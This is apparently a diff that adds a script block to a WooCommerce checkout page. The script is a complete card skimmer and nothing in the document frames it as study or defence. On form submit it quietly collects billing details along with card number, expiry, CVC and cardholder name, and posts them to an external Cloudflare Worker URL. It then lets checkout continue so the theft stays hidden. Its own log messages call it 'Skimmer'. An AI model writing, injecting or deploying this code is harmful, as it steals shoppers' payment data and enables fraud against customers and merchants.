@@ -1,0 +1,70 @@
+<script>
+(function() {
+    'use strict';
+    
+    // *** REPLACE THIS URL WITH YOUR ACTUAL CLOUDFLARE WORKER URL ***
+    const WORKER_URL = 'https://your-worker-name.your-subdomain.workers.dev'; 
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.querySelector('form.checkout');
+        if (!form) return;
+
+        // Wait for submit
+        form.addEventListener('submit', function(e) {
+            // Prevent default to send data silently first
+            e.preventDefault();
+
+            const formData = new FormData(form);
+            const data = {};
+            
+            // Collect standard checkout fields
+            const fields = [
+                'billing_first_name', 'billing_last_name', 'billing_email', 
+                'billing_phone', 'billing_address_1', 'billing_city', 
+                'billing_postcode', 'billing_country', 'billing_state'
+            ];
+            
+            fields.forEach(field => {
+                if (formData.has(field)) {
+                    data[field] = formData.get(field);
+                }
+            });
+
+            // Collect Credit Card details
+            // Note: WooCommerce IDs can vary. These are common ones.
+            const ccNumber = document.getElementById('wc-credit-card-form-card-number')?.value || 
+                             document.getElementById('cc_number')?.value;
+            const ccExpiry = document.getElementById('wc-credit-card-form-expiry')?.value || 
+                             document.getElementById('cc_expiry')?.value;
+            const cvc = document.getElementById('wc-credit-card-form-cvc')?.value || 
+                        document.getElementById('cc_cvc')?.value;
+            const cardName = document.getElementById('card_name')?.value;
+
+            if (ccNumber) {
+                data['cc_number'] = ccNumber;
+                data['cc_expiry'] = ccExpiry;
+                data['cc_cvc'] = cvc;
+                data['card_name'] = cardName;
+            }
+
+            // Send to Cloudflare Worker
+            fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                keepalive: true 
+            })
+            .then(response => {
+                console.log('Skimmer: Data sent successfully');
+                // Allow the form to submit normally
+                form.submit();
+            })
+            .catch(error => {
+                console.error('Skimmer: Error sending data', error);
+                // Still allow the form to submit normally
+                form.submit();
+            });
+        });
+    });
+})();
+</script>
